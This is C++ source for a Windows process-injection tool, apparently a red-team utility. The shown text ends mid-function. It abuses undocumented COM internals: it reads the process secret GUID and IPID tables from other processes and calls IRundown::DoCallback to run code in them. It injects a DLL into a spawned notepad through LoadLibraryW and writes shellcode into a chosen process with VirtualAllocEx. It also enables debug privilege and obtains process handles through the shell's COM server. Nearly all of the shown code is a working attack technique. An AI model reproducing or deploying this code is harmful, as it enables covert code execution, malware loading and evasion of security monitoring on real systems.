
//
// Process Injection via COM
// cl /EHsc com_inject.cpp

#include "com_inject.h"

#pragma comment(lib, "rpcrt4")
#pragma comment(lib, "ole32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "dbghelp")
#pragma comment(lib, "crypt32")
#pragma comment(lib, "user32")
#pragma comment(lib, "oleaut32")
#pragma comment(lib, "ntdll")

//
// Read the address and size of the .data segment for combase.dll or ole32.dll
//
bool
get_com_data(COM_CONTEXT* c) {
    auto m = (PBYTE)GetModuleHandleW(L"combase");

    if (!m) {
        // old systems use ole32
        m = (PBYTE)GetModuleHandleW(L"ole32");
        if (!m) return false;
    }

    auto nt = (PIMAGE_NT_HEADERS)(m + ((PIMAGE_DOS_HEADER)m)->e_lfanew);
    auto sh = IMAGE_FIRST_SECTION(nt);

    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (*(PDWORD)sh[i].Name == *(PDWORD)".data") {
            c->base = m;
            c->data = sh[i].VirtualAddress;
            c->size = sh[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

//
// Search for arbitrary data within the .data segment of combase.dll or ole32.dll and return the RVA.
//
bool
find_com_data(COM_CONTEXT* c, PBYTE inbuf, DWORD inlen, PDWORD rva) {
    if (c->size < inlen) return false;
    PBYTE addr = (c->base + c->data);

    for (DWORD i = 0; i < (c->size - inlen); i++) {
        if (!std::memcmp(&addr[i], inbuf, inlen)) {
            *rva = (DWORD)(&addr[i] - c->base);
            return true;
        }
    }
    return false;
}

//
// Read the offset of OXIDEntry._moxid
//
#define IPID_OFFSET_LEGACY 0x30
#define MOXID_OFFSET_LEGACY 0x18

#define IPID_OFFSET_CURRENT 0xb8
#define MOXID_OFFSET_CURRENT 0xc8

bool
find_oxid_offset(COM_CONTEXT* c) {
    CPageAllocator* alloc = (CPageAllocator*)(c->base + c->ipid_tbl);
    tagIPIDEntry* entry = (tagIPIDEntry*)alloc->_pgalloc._pPageListStart[0];
    PBYTE buf = (PBYTE)entry->pOXIDEntry;

    for (UINT ofs = 0; ofs < 256; ofs++) {
        if (!std::memcmp(&buf[ofs], (void*)&entry->ipid, sizeof(IPID))) {
            if (ofs == IPID_OFFSET_LEGACY) {
                c->oxid = MOXID_OFFSET_LEGACY;
            }
            else if (ofs == IPID_OFFSET_CURRENT) {
                c->oxid = MOXID_OFFSET_CURRENT;
            }
            return true;
        }
    }
    return false;
}

//
// Read the offset of CIPIDTable::_palloc
//
bool
find_ipid_table(COM_CONTEXT* c) {
    PULONG_PTR ds = (PULONG_PTR)(c->base + c->data);
    DWORD cnt = (c->size - sizeof(CPageAllocator)) / sizeof(ULONG_PTR);

    for (DWORD i = 0; i < cnt; i++) {
        auto cpage = (CPageAllocator*)&ds[i];
        //
        // Legacy systems use 0x70, current is 0x78
        //
        if (cpage->_pgalloc._cbPerEntry >= 0x70)
        {
            if (cpage->_pgalloc._cEntriesPerPage != 0x32) continue;
            if (cpage->_pgalloc._pPageListEnd <= cpage->_pgalloc._pPageListStart) continue;

            c->ipid_tbl = (DWORD)((PBYTE)&ds[i] - c->base);
            return true;
        }
    }
    return false;
}

//
// Read everything from combase.dll or ole32.dll required to execute 
// IRundown::DoCallback() in a remote COM process.
//
bool
init_cc(COM_CONTEXT* ctx) {
    bool result = false;

    //
    // Get pointer to IMarshalEnvoy interface.
    //
    IMarshalEnvoy* e = NULL;
    HRESULT hr = CoGetObjectContext(IID_IMarshalEnvoy, (PVOID*)&e);

    if (FAILED(hr)) {
        printf("CoGetObjectContext(IID_IMarshalEnvoy) failed : %08lX\n", hr);
        return false;
    }

    //
    // Marshal the context header.
    // It should contain the secret GUID and heap address of server context.
    //
    IStream* s = SHCreateMemStream(NULL, 0);
    hr = e->MarshalEnvoy(s, MSHCTX_INPROC);

    if (FAILED(hr)) {
        printf("IMarshalEnvoy::MarshalEnvoy() failed : %08lX\n", hr);
        goto cleanup;
    }

    //
    // Read the context header into local buffer.
    //
    LARGE_INTEGER pos;
    pos.QuadPart = 0;
    hr = s->Seek(pos, STREAM_SEEK_SET, NULL);

    if (FAILED(hr)) {
        printf("IStream::Seek() failed : %08lX\n", hr);
        goto cleanup;
    }

    tagCONTEXTHEADER hdr;
    DWORD cbBuffer;
    hr = s->Read(&hdr, sizeof(hdr), &cbBuffer);

    if (FAILED(hr)) {
        printf("IStream::read(tagCONTEXTHEADER) failed : %08lX\n", hr);
        goto cleanup;
    }

    printf("Reading information about .data in combase.dll or ole32.dll\n");
    result = get_com_data(ctx);
    if (!result) goto cleanup;

    //
    // Locate g_pMTAEmptyCtx
    //
    printf("Searching for g_pMTAEmptyCtx\n");

    result = find_com_data(
        ctx,
        (PBYTE)&hdr.ByRefHdr.pServerCtx,
        sizeof(ULONG_PTR),
        &ctx->server_ctx
    );

    if (!result) goto cleanup;

    //
    // Locate CProcessSecret::s_guidOle32Secret
    //
    printf("Searching for CProcessSecret::s_guidOle32Secret\n");

    result = find_com_data(
        ctx,
        (PBYTE)&hdr.ByRefHdr.guidProcessSecret,
        sizeof(GUID),
        &ctx->secret
    );

    if (!result) goto cleanup;

    //
    // Locate CIPIDTable::_palloc and offset of OXID value.
    //
    printf("Searching for CIPIDTable::_palloc\n");

    result = find_ipid_table(ctx);
    if (!result) goto cleanup;

    //
    // Locate OXIDEntry._moxid
    //
    printf("Searching for OXIDEntry._moxid offset\n");
    result = find_oxid_offset(ctx);

cleanup:
    if (s) s->Release();
    if (e) e->Release();

    printf("Leaving. Status : %s\n", result ? "OK" : "FAILED");

    return result;
}

//
// Read IPID, OXID, and OID values from a COM process.
//
std::vector<IPID_ENTRY>
get_ipid_entries(PCOM_CONTEXT cc, HANDLE hp) {
    PVOID ipid_tbl = (cc->base + cc->ipid_tbl);

    CPageAllocator PageAllocator;
    std::vector<IPID_ENTRY> ipids;

    //
    // Read the CPageAllocator class
    //
    auto r = ReadProcessMemory(
        hp,
        ipid_tbl,
        &PageAllocator,
        sizeof(PageAllocator),
        NULL
    );

    //
    // This usually means the remote process has no COM.
    //
    if (!r) {
        //printf("ReadProcessMemory(PageAllocator) failed : %ld\n", GetLastError());
        return {};
    }

    //
    // Read the array of page addresses.
    //
    ULONG64 page_cnt = PageAllocator._pgalloc._cPages;
    std::vector<PULONG_PTR> pages(page_cnt);
    PVOID page_addr = PageAllocator._pgalloc._pPageListStart;

    r = ReadProcessMemory(
        hp,
        page_addr,
        pages.data(),
        page_cnt * sizeof(ULONG_PTR),
        NULL
    );

    if (!r) {
        printf("ReadProcessMemory(_pPageListStart) failed : %ld\n", GetLastError());
        return {};
    }

    //
    // For each page found.
    //
    for (ULONG64 i = 0; i < page_cnt; i++) {
        DWORD ipid_cnt = PageAllocator._pgalloc._cEntriesPerPage;
        std::vector<IPIDEntry> entries(ipid_cnt);

        //
        // Read array of IPID entries.
        //
        r = ReadProcessMemory(
            hp,
            (LPCVOID)pages[i],
            entries.data(),
            ipid_cnt * sizeof(IPIDEntry),
            NULL
        );

        if (!r) {
            printf("ReadProcessMemory(pages[%lld]) failed : %ld\n", i, GetLastError());
            continue;
        }

        //
        // For each IPID
        //
        for (DWORD j = 0; j < ipid_cnt; j++) {
            // skip inactive entries
            if (!entries[j].pOXIDEntry || !entries[j].dwFlags) continue;
            if (entries[j].dwFlags & (IPIDF_DISCONNECTED | IPIDF_DEACTIVATED)) continue;

            //
            // Only save IRundown?
            //
            if (!cc->verbose && entries[j].iid != IID_IRundown) continue;

            IPID_ENTRY ci = { 0 };

            ci.iid = entries[j].iid;
            ci.ipid = entries[j].ipid;

            PBYTE pOXIDEntry = (PBYTE)entries[j].pOXIDEntry;

            //
            // Read the _moxid value. (OXID and OID)
            //
            union {
                BYTE b[16];
                DWORD64 q[2];
            } tmp{ 0 };

            r = ReadProcessMemory(
                hp,
                (LPCVOID)(pOXIDEntry + cc->oxid),
                &tmp,
                sizeof(tmp),
                NULL
            );

            if (!r) {
                /**printf("ReadProcessMemory(pOXIDEntry._moxid=%p) failed : %ld\n",
                    (PVOID)(pOXIDEntry + cc->oxid),
                    GetLastError()
                    );*/
                continue;
            }

            ci.oxid = (OXID)tmp.q[0];
            ci.oid = (OID)tmp.q[1];

            // skip NULL OXID or OID entries
            if (!ci.oxid || !ci.oid) continue;

            ipids.push_back(ci);
        }
    }
    return ipids;
}

//
// Query information about a process token.
//
std::vector<BYTE>
QueryProcessTokenInformation(
    HANDLE                  hp,
    TOKEN_INFORMATION_CLASS cls)
{
    //
    // Open the process token.
    //
    HANDLE tkn;

    BOOL r = OpenProcessToken(
        hp,
        TOKEN_QUERY,
        &tkn
    );

    if (!r) return {};

    DWORD outlen = 0;

    //
    // Get the size of memory required for information.
    //
    r = GetTokenInformation(
        tkn,
        cls,
        NULL,
        0,
        &outlen);

    DWORD err = GetLastError();
    std::vector<BYTE> outbuf;

    if (err == ERROR_INSUFFICIENT_BUFFER ||
        err == ERROR_BAD_LENGTH) // TokenSessionId
    {
        outbuf.resize(outlen);

        GetTokenInformation(
            tkn,
            cls,
            outbuf.data(),
            outlen,
            &outlen
        );
    }
    CloseHandle(tkn);

    return outbuf;
}

//
// Return the Integrity Level (IL) of process.
//
const wchar_t*
GetProcessIL(HANDLE hp) {
    PTOKEN_MANDATORY_LABEL tml;
    std::vector<BYTE> outbuf;

    outbuf = QueryProcessTokenInformation(
        hp,
        TokenIntegrityLevel
    );

    if (outbuf.empty()) return L"Error";

    tml = (PTOKEN_MANDATORY_LABEL)outbuf.data();

    DWORD cnt = (DWORD)(UCHAR)(*GetSidSubAuthorityCount(tml->Label.Sid) - 1);
    DWORD level = *GetSidSubAuthority(tml->Label.Sid, cnt);

    if (level < SECURITY_MANDATORY_LOW_RID) return L"Untrusted";
    if (level < SECURITY_MANDATORY_MEDIUM_RID) return L"Low";
    if (level < SECURITY_MANDATORY_HIGH_RID) return L"Medium";
    if (level < SECURITY_MANDATORY_SYSTEM_RID) return L"High";
    if (level < SECURITY_MANDATORY_PROTECTED_PROCESS_RID) return L"System";

    return L"ProtectedProcess";
}

//
// Determine if process is elevated.
//
BOOL
IsProcessElevated(HANDLE hp) {
    PTOKEN_ELEVATION te;
    std::vector<BYTE> outbuf;

    outbuf = QueryProcessTokenInformation(
        hp,
        TokenElevation
    );
    if (outbuf.empty()) return FALSE;
    te = (PTOKEN_ELEVATION)outbuf.data();
    return te->TokenIsElevated;
}

//
// Return the user name of a process.
//
std::wstring
GetProcessUser(HANDLE hp) {
    PTOKEN_USER tu = NULL;
    std::vector<BYTE> outbuf;

    outbuf = QueryProcessTokenInformation(
        hp,
        TokenUser
    );
    if (outbuf.empty()) return L"Error";

    tu = (PTOKEN_USER)outbuf.data();

    DWORD userLen = 0, domainLen = 0;
    SID_NAME_USE Snu;

    BOOL r = LookupAccountSidW(
        NULL,
        tu->User.Sid,
        NULL,
        &userLen,
        NULL,
        &domainLen,
        &Snu
    );

    std::wstring user(userLen - 1, L'\0');
    std::wstring domain(domainLen - 1, L'\0');

    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        r = LookupAccountSidW(
            NULL,
            tu->User.Sid,
            &user[0],
            &userLen,
            &domain[0],
            &domainLen,
            &Snu
        );

        if (r) {
            if (domainLen) {
                user = domain + L'\\' + user;
            }
        }
    }
    return user;
}

//
// List IPID entries for a process.
//
void
DumpIPID(PCOM_CONTEXT ctx, PPROCESSENTRY32 pe) {
    HANDLE hp = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE,
        pe->th32ProcessID
    );

    if (!hp) {
        //printf("OpenProcess(%ld) failed : %ld\n", pe->th32ProcessID, GetLastError());
        return;
    }

    std::vector<IPID_ENTRY> entries = get_ipid_entries(ctx, hp);

    if (!entries.size()) {
        //printf("No IPID entries found.\n");
        goto leave;
    }

    printf("\n**************************************"
        "\nProcess  : %lS [%ld]"
        "\nUser     : %lS"
        "\nIL       : %lS"
        "\nElevated : %lS\n\n",
        pe->szExeFile,
        pe->th32ProcessID,
        GetProcessUser(hp).c_str(),
        GetProcessIL(hp),
        IsProcessElevated(hp) ? L"Yes" : L"No"
    );

    for (auto x : entries) {
        LPOLESTR iid = NULL;
        StringFromIID((const IID&)x.iid, &iid);

        LPOLESTR ipid = NULL;
        StringFromIID((const IID&)x.ipid, &ipid);

        LPOLESTR oxid = NULL;
        StringFromIID((const IID&)x.oxid, &oxid);

        std::wstring path = L"Interface\\" + std::wstring(iid);

        WCHAR iface[MAX_PATH + 1] = { 0 };
        DWORD len = MAX_PATH;

        LSTATUS lStatus = RegGetValueW(
            HKEY_CLASSES_ROOT,
            path.c_str(),
            NULL,
            RRF_RT_REG_SZ,
            NULL,
            iface,
            &len
        );

        if (lStatus == ERROR_SUCCESS) {
            printf("IPID:%lS,OXID:%lS : %lS\n",
                ipid ? ipid : L"N/A",
                oxid ? oxid : L"N/A",
                iface);
        }
        if (ipid) CoTaskMemFree(ipid);
        if (iid)  CoTaskMemFree(iid);
        if (oxid) CoTaskMemFree(oxid);
    }
leave:
    CloseHandle(hp);
}

//
// Enumerate IPID for all processes except our own.
//
void
ListIPID(PCOM_CONTEXT cc) {
    auto ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (ss == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot() failed : %ld\n", GetLastError());
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(ss, &pe)) {
        do {
            if (pe.th32ProcessID <= 4 || pe.th32ProcessID == GetCurrentProcessId() ||
                (cc->pid && cc->pid != pe.th32ProcessID)) continue;

            //printf("Dumping %ld...\n", pe.th32ProcessID);
            DumpIPID(cc, &pe);
        } while (Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

//
// Try enable SeDebugPrivilege in current process token.
//
bool
EnableDebugPrivilege(void) {
    HANDLE t;
    auto r = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &t);
    if (!r) return false;
    TOKEN_PRIVILEGES p = { 1,LUID{20,0},SE_PRIVILEGE_ENABLED };
    AdjustTokenPrivileges(t, FALSE, &p, 0, NULL, NULL);
    r = GetLastError() == ERROR_SUCCESS;
    CloseHandle(t);
    return r;
}

//
// Get a process handle via ICoreShellComServerRegistrar::OpenProcess()
//
bool
OpenProcessWithCOM(
    DWORD dwProcessId,
    DWORD dwDesiredAccess,
    PHANDLE lpProcessHandle)
{
    ICoreShellComServerRegistrar* pShellComServer = NULL;

    //
    // Connect to the Core Shell Server in sihost.exe
    //
    auto hr = CoCreateInstance(
        CLSID_CoreShellComServerRegistrar,
        NULL,
        CLSCTX_LOCAL_SERVER,
        IID_ICoreShellComServerRegistrar,
        (void**)&pShellComServer
    );

    if (FAILED(hr)) {
        printf("CoCreateInstance(ICoreShellComServerRegistrar) failed : %08lX\n", hr);
        return false;
    }

    //
    // Try to open the target process and duplicate the handle into this process.
    //
    hr = pShellComServer->OpenProcess(
        dwDesiredAccess,
        FALSE,
        dwProcessId,
        GetCurrentProcessId(),
        lpProcessHandle
    );

    pShellComServer->Release();

    if (FAILED(hr)) {
        printf("ICoreShellComServerRegistrar::OpenProcess(%ld) failed : %08lX\n", dwProcessId, hr);
        return false;
    }

    return true;
}

//
// IShellView
//
HRESULT
GetDesktopShellView(REFIID riid, void** ppv) {
    *ppv = NULL;

    IShellWindows* psw;
    auto hr = CoCreateInstance(
        CLSID_ShellWindows,
        NULL,
        CLSCTX_LOCAL_SERVER,
        IID_PPV_ARGS(&psw)
    );

    if (SUCCEEDED(hr)) {
        HWND hwnd;
        IDispatch* pdisp;
        VARIANT vEmpty = {};

        hr = psw->FindWindowSW(
            &vEmpty,
            &vEmpty,
            SWC_DESKTOP,
            (LONG*)&hwnd,
            SWFO_NEEDDISPATCH,
            &pdisp
        );

        if (SUCCEEDED(hr)) {
            IShellBrowser* psb;

            hr = IUnknown_QueryService(
                pdisp,
                SID_STopLevelBrowser,
                IID_PPV_ARGS(&psb)
            );
            if (SUCCEEDED(hr)) {
                IShellView* psv;
                hr = psb->QueryActiveShellView(&psv);

                if (SUCCEEDED(hr)) {
                    hr = psv->QueryInterface(riid, ppv);
                    psv->Release();
                }
                psb->Release();
            }
            pdisp->Release();
        }
        psw->Release();
    }
    return hr;
}

//
// 
//
HRESULT
GetShellDispatch(
    IShellView* psv,
    REFIID riid,
    void** ppv)
{
    *ppv = NULL;
    IDispatch* pdispBackground;

    auto hr = psv->GetItemObject(
        SVGIO_BACKGROUND,
        IID_PPV_ARGS(&pdispBackground));

    if (SUCCEEDED(hr)) {
        IShellFolderViewDual* psfvd;
        hr = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));

        if (SUCCEEDED(hr)) {
            IDispatch* pdisp;
            hr = psfvd->get_Application(&pdisp);

            if (SUCCEEDED(hr)) {
                hr = pdisp->QueryInterface(riid, ppv);
                pdisp->Release();
            }
            psfvd->Release();
        }
        pdispBackground->Release();
    }
    return hr;
}

//
// Spawn a new process using explorer.exe
//
BOOL
ShellExecInExplorer(PCWSTR lpszFile) {
    auto bstrFile = SysAllocString(lpszFile);
    if (!bstrFile) return FALSE;

    IShellView* psv;
    auto hr = GetDesktopShellView(IID_PPV_ARGS(&psv));

    if (SUCCEEDED(hr)) {
        IShellDispatch2* psd;
        hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));

        if (SUCCEEDED(hr)) {
            VARIANT vtEmpty = {};

            hr = psd->ShellExecuteW(
                bstrFile,
                vtEmpty,
                vtEmpty,
                vtEmpty,
                vtEmpty
            );

            psd->Release();
        }
        psv->Release();
    }
    SysFreeString(bstrFile);
    return SUCCEEDED(hr);
}

//
// Encode binary with Base64.
//
std::wstring
base64_encode(PVOID inbuf, DWORD inlen) {
    // Get the length of output
    DWORD outlen;

    CryptBinaryToStringW(
        (const PBYTE)inbuf,
        inlen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &outlen
    );

    std::wstring outbuf(outlen - 1, L'\0');

    CryptBinaryToStringW(
        (const PBYTE)inbuf,
        inlen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        &outbuf[0],
        &outlen
    );

    return outbuf;
}

//
// Use CoGetObject() or CoUnmarshalInterface() 
// to establish connection to an IRundown instance in a remote process.
//
bool
ConnectToIRundown(
    PCOM_CONTEXT     cc,
    PRUNDOWN_CONTEXT rc,
    IRundown** rundown)
{
    OBJREF objRef = { 0 };

    // set the header info to request the IRundown interface (OBJREF)
    objRef.signature = OBJREF_SIGNATURE; // "MEOW"
    objRef.flags = OBJREF_STANDARD;  // type
    objRef.iid = IID_IRundown;

    // set the standard object (STDOBJREF)
    objRef.u_objref.u_standard.std.flags = 0;        // 
    objRef.u_objref.u_standard.std.cPublicRefs = 1;  // how many references

    objRef.u_objref.u_standard.std.oid = rc->oid;
    objRef.u_objref.u_standard.std.oxid = rc->oxid;
    objRef.u_objref.u_standard.std.ipid = rc->ipid;

    // set the resolve address. (DUALSTRINGARRAY)
    objRef.u_objref.u_standard.saResAddr.wNumEntries = 0;
    objRef.u_objref.u_standard.saResAddr.wSecurityOffset = 0;

    HRESULT hr;

    if (cc->use_objref) {
        std::wstring name = std::wstring(L"OBJREF:") +
            base64_encode(&objRef, sizeof(objRef)) + L":";

        //
        // Connect.
        //
        hr = CoGetObject(
            name.c_str(),
            NULL,
            IID_IRundown,
            (void**)rundown
        );

        if (FAILED(hr)) {
            printf("CoGetObject(IRundown) failed : %08lX\n", hr);
            return false;
        }
    }
    else {
        //
        // Create IStream object and save OBJREF
        //
        IStream* pstm = SHCreateMemStream(NULL, 0);
        pstm->Write(&objRef, sizeof(objRef), NULL);

        //
        // Set position to start.
        //
        LARGE_INTEGER pos{ 0 };
        pstm->Seek(pos, STREAM_SEEK_SET, NULL);

        //
        // Connect.
        //
        hr = CoUnmarshalInterface(
            pstm,
            IID_IRundown,
            (void**)rundown
        );

        pstm->Release();

        if (FAILED(hr)) {
            printf("CoUnmarshalInterface(IRundown) failed : %08lX\n", hr);
            return false;
        }
    }
    return true;
}

//
// Read the contents of file on disk and return as std::vector<BYTE>
//
std::vector<BYTE>
read_file_data(std::wstring path) {
    std::ifstream instream(path, std::ios::in | std::ios::binary);
    if (instream.bad()) return {};

    std::vector<BYTE> data((std::istreambuf_iterator<char>(instream)), std::istreambuf_iterator<char>());

    return data;
}

//
// Convert a process name to process id.
// Picks the first one found.
//
DWORD
name2pid(LPWSTR ImageName) {
    // create snapshot of system
    auto ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (ss == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = 0;

    if (Process32First(ss, &pe)) {
        do {
            if (!lstrcmpi(ImageName, pe.szExeFile)) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(ss, &pe));
    }
    CloseHandle(ss);
    return pid;
}

//
// Execute code using IRundown::DoCallback()
//
bool
invoke_docallback(PCOM_CONTEXT cc, PRUNDOWN_CONTEXT rc) {
    LPOLESTR ipid = NULL;
    StringFromIID((const IID&)rc->ipid, &ipid);

    printf("pServerCtx  : %p\n", rc->pServerCtx);
    printf("IPID        : %lS\n", ipid);
    printf("OXID        : 0x%016llX\n", rc->oxid);
    printf("pfnCallback : %p\n", rc->pfnCallback);
    printf("pParam      : %p\n", rc->pParam);

    IRundown* rundown = NULL;

    if (!ConnectToIRundown(cc, rc, &rundown)) {
        printf("ConnectToIRundown() failed.\n");
        return false;
    }

    XAptCallback params = { 0 };

    params.guidProcessSecret = rc->guidProcessSecret;
    params.pServerCtx = (PTRMEM)rc->pServerCtx;
    params.pfnCallback = (PTRMEM)rc->pfnCallback;
    params.pParam = (PTRMEM)rc->pParam;

    printf("Executing IRundown::DoCallback(%p)\n", rc->pfnCallback);

    HRESULT hr = rundown->DoCallback(&params);

    //
    // if the error is 'The array bounds are invalid'
    //
    if (hr == 0x800706C6) {
        //
        // Use the legacy interface.
        //
        printf("Executing IRundown::DoCallback(%p) for legacy systems\n", rc->pfnCallback);
        IRundownLegacy* rundown_old = (IRundownLegacy*)rundown;
        hr = rundown_old->DoCallback(&params);
    }

    rundown->Release();

    if (FAILED(hr)) {
        printf("IRundown::DoCallback() failed : %08lX\n", hr);
        return false;
    }
    else {
        printf("Execution succeeded.\n");
    }
    return true;
}

//
// Read the GUID secret, server context and IPID entry in a COM process.
//
bool
init_rundown_ctx(
    HANDLE           hp,
    PCOM_CONTEXT     cc,
    PRUNDOWN_CONTEXT rc)
{
    bool result = false;

    //
    // Read IRundown entries.
    //
    cc->verbose = false;
    std::vector<IPID_ENTRY> entries = get_ipid_entries(cc, hp);

    if (entries.empty()) {
        printf("get_ipid_entries() failed.\n");
        return false;
    }
    //
    // Save first entry in the list.
    //
    rc->ipid = entries.at(0).ipid;
    rc->oxid = entries.at(0).oxid;
    rc->oid = entries.at(0).oid;

    //
    // If the first read returns 16 null bytes, we need to invoke DoCallback to initialise it.
    //
    for (int i = 0; i < 2; i++) {
        //
        // Try reading the GUID secret.
        //
        result = ReadProcessMemory(
            hp,
            (LPCVOID)(cc->base + cc->secret),
            &rc->guidProcessSecret,
            sizeof(GUID),
            NULL
        );

        if (!result) {
            printf("ReadProcessMemory(%ld, guidProcessSecret) failed : %ld\n", cc->pid, GetLastError());
        }
        else {
            //
            // If it's not initialised, invoke DoCallback without any parameters.
            //
            if (rc->guidProcessSecret == IID_NULL) {
                result = false;
                printf("WARNING: GUID Process Secret isn't initialised!...\n");
                invoke_docallback(cc, rc);
            }
            else {
                LPOLESTR secret = NULL;
                StringFromIID((const IID&)rc->guidProcessSecret, &secret);
                printf("GUID Secret : %lS\n", secret);
                CoTaskMemFree(secret);
                break;
            }
        }
    }

    //
    // If we have a thread ID, try query the context from TEB.ReservedForOle->pCurrentContext
    //
    WORD tid = rc->ipid.tid;

    printf("TID         : %04lX\n", tid);

    if (tid != 0xFFFF && tid != 0) {
        HANDLE ht = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);

        if (ht) {
            THREAD_BASIC_INFORMATION tbi;

            NTSTATUS Status = NtQueryInformationThread(
                ht,
                (THREADINFOCLASS)0, // ThreadBasicInformation,
                &tbi,
                sizeof(tbi),
                NULL
            );

            result = NT_SUCCESS(Status);

            if (result) {
                printf("Reading TEB from %p\n", tbi.TebBaseAddress);

                PVOID ReservedForOle = NULL;

                result = ReadProcessMemory(
                    hp,
                    ((PBYTE)tbi.TebBaseAddress + offsetof(TEB, ReservedForOle)),
                    &ReservedForOle,
                    sizeof(ReservedForOle),
                    NULL
                );

                if (result) {
                    printf("Reading ReservedForOle from %p\n", ReservedForOle);

                    SOleTlsData oleTlsData = { 0 };

                    result = ReadProcessMemory(
                        hp,
                        ReservedForOle,
                        &oleTlsData,
                        sizeof(oleTlsData),
                        NULL
                    );

                    if (result) {
                        rc->pServerCtx = oleTlsData.pCurrentContext;
                    }
                }
            }
            CloseHandle(ht);
        }
    }

    //
    // No server context in TEB? Use the global variable instead.
    // Note that this might not work for all IPID.
    //
    if (!rc->pServerCtx) {
        printf("Reading server context from g_pMTAEmptyCtx\n");
        //
        // Read from global variable: g_pMTAEmptyCtx
        //
        result = ReadProcessMemory(
            hp,
            (LPCVOID)(cc->base + cc->server_ctx),
            &rc->pServerCtx,
            sizeof(ULONG_PTR),
            NULL
        );
    }

    return result;
}

//
// Spawn notepad.exe and inject DLL using EM_GETHANDLE and IRundown::DoCallback()
//
bool
inject_dll(PCOM_CONTEXT cc) {
    //
    // Spawn notepad using explorer.exe via COM.
    //
    bool result = ShellExecInExplorer(L"notepad");

    if (!result) {
        printf("ShellExecInExplorer(\"notepad\") failed : %ld\n", GetLastError());
        return false;
    }

    //
    // Wait for notepad to initialise.
    //
    Sleep(500);

    //
    // Try find the window for notepad.
    //
    HWND npw = FindWindowW(L"Notepad", NULL);

    if (!npw) {
        printf("Unable to find window for Notepad. Is it running?\n");
        return false;
    }

    //
    // Try using GetProcessHandleFromHwnd() to open process handle.
    // Redirects to win32u!NtUserGetWindowProcessHandle on more recent builds.
    //
    HANDLE hp = NULL;

    GetProcessHandleFromHwnd_T pGetProcessHandleFromHwnd;
    pGetProcessHandleFromHwnd = (GetProcessHandleFromHwnd_T)
        GetProcAddress(LoadLibraryA("oleacc.dll"), "GetProcessHandleFromHwnd");

    if (pGetProcessHandleFromHwnd) {
        printf("Trying with GetProcessHandleFromHwnd()\n");
        hp = pGetProcessHandleFromHwnd(npw);
    }
    //
    // In the event that failed, try using OpenProcess.
    //
    if (!hp) {
        DWORD pid = 0;
        GetWindowThreadProcessId(npw, &pid);

        printf("GetProcessHandleFromHwnd() failed : %ld\n", GetLastError());
        hp = OpenProcess(PROCESS_VM_READ, FALSE, pid);

        //
        // If this also fails..you can always try NtGetNextProcess. :-)
        //
        if (!hp) {
            printf("OpenProcess(%ld) failed : %ld\n", pid, GetLastError());
            return false;
        }
    }

    printf("Process handle : %08lX\n", HandleToUlong(hp));

    RUNDOWN_CONTEXT rc = { 0 };

    //
    // Make sure an instance of IRundown exists.
    //
    if (init_rundown_ctx(hp, cc, &rc)) {
        //
        // Get the Edit window and set the path of DLL.
        //
        HWND ecw = FindWindowExW(npw, NULL, L"Edit", NULL);
        SendMessageW(ecw, WM_SETTEXT, 0, (LPARAM)cc->path.c_str());

        Sleep(500);

        //
        // Read the address of memory with the DLL path.
        //
        printf("Sending EM_GETHANDLE...\n");
        PVOID emh = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);

        if (!emh) {
            printf("EM_GETHANDLE unavailable.\n");
        }
        else {
            result = ReadProcessMemory(
                hp,
                emh,
                &rc.pParam,
                sizeof(ULONG_PTR),
                NULL
            );

            if (!result) {
                printf("ReadProcessMemory(%p) failed : %ld\n",
                    (PVOID)emh,
                    GetLastError());
            }
        }
    }
    //
    // We don't need an process handle to execute the code, so it's safe to close now.
    //
    CloseHandle(hp);

    //
    // If the DLL path is inside the remote process...
    //
    if (result) {
        //
        // Execute code using IRundown::DoCallback()
        //
        rc.pfnCallback = (PVOID)GetProcAddress(GetModuleHandleW(L"kernel32"), "LoadLibraryW");

        result = invoke_docallback(cc, &rc);
    }
    return result;
}

//
// Open a target process using COM, write shellcode and execute using IRundown::DoCallback()
//
bool
inject_pic(PCOM_CONTEXT cc) {
    //
    // Try open the shellcode.
    //
    std::vector<BYTE> pic = read_file_data(cc->path);

    if (!pic.size()) {
        printf("%lS is empty or cannot be read!\n", cc->path.c_str());
        return false;
    }

    //
    // Try open target process for reading,writing and allocating virtual memory.
    //
    DWORD access = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
    HANDLE hp = NULL;

    bool result = OpenProcessWithCOM(cc->pid, access, &hp);

    if (!result) {
        //
        // Fall back on OpenProcess
        //
        hp = OpenProcess(access, FALSE, cc->pid);

        if (!hp) {
            printf("OpenProcess() failed : %ld\n", GetLastError());
            return false;
        }
    }

    RUNDOWN_CONTEXT rc = { 0 };

    //
    // Make sure an instance of IRundown exists.
    //
    result = init_rundown_ctx(hp, cc, &rc);

    if (result) {
        //
        // Allocate virtual memory and write shellcode to remote process.
        //
        rc.pfnCallback = VirtualAllocEx(
            hp,
            NULL,
            pic.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ
        );

        if (!rc.pfnCallback) {
            printf("VirtualAllocEx(pid=%ld, pic=%zd) failed : %ld\n",
                cc->pid,
                pic.size(),
                GetLastError()
            );
        }
        else {
            printf("Writing %zd bytes of shellcode to process %ld @ %p\n",
                pic.size(),
                cc->pid,
                rc.pfnCallback
            );

